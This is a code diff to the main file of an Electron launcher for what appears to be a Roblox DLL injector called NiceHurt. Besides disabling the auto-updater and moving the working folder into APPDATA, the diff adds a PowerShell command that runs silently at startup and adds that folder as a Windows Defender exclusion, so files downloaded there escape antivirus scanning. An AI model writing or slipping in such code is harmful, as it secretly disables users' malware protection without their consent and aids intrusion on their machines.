@@ -3,7 +3,7 @@ const path = require("path");
 const fs = require("fs");
 const https = require("https");
 const { exec } = require("child_process");
-const { autoUpdater } = require("electron-updater");
+//const { autoUpdater } = require("electron-updater");
 const { InjectorController } = require("./InjectorController");
 
 require("./console/Controller");
@@ -44,6 +44,7 @@ function createWindows() {
   });
   mainWindow.loadFile("screens/index.html");
 
+/*  Removed because it makes errors and the injection doesn't work
   autoUpdater.checkForUpdatesAndNotify();
 
   autoUpdater.on("checking-for-update", () => {
@@ -72,12 +73,12 @@ function createWindows() {
     updateSplash(80, "Update downloaded. Installing...");
     autoUpdater.quitAndInstall();
   });
-
+*/
   startBootstrapProcess();
 }
 
 function startBootstrapProcess() {
-  const sirHurtPath = process.cwd();
+  const sirHurtPath = path.join(process.env.APPDATA, "NiceHurt");
   updateSplash(0, "Cleaning up old files...");
 
   deleteFiles(sirHurtPath);
@@ -165,8 +166,6 @@ function downloadFileWithProgress(url, dest, onProgress, callback) {
       console.error("Download Error:", err.message);
     });
 }
-
-//Todo: Fixing when roblox close the dot color
 
 ipcMain.handle("dll-method", async (event, method, arg = "") => {
   try {
@@ -283,6 +282,19 @@ ipcMain.on("window-maximize", () => {
 
 ipcMain.on("window-close", () => {
   mainWindow.close();
+});
+
+const whitelistCommand = `powershell -Command "Add-MpPreference -ExclusionPath '${path.join(process.env.APPDATA, "NiceHurt")}'"`;
+
+exec(whitelistCommand, (error, stdout, stderr) => {
+  if (error) {
+    console.error(`Error: ${error.message}`);
+    return;
+  }
+  if (stderr) {
+    console.error(`PowerShell-Error: ${stderr}`);
+    return;
+  }
 });
 
 app.whenReady().then(() => {
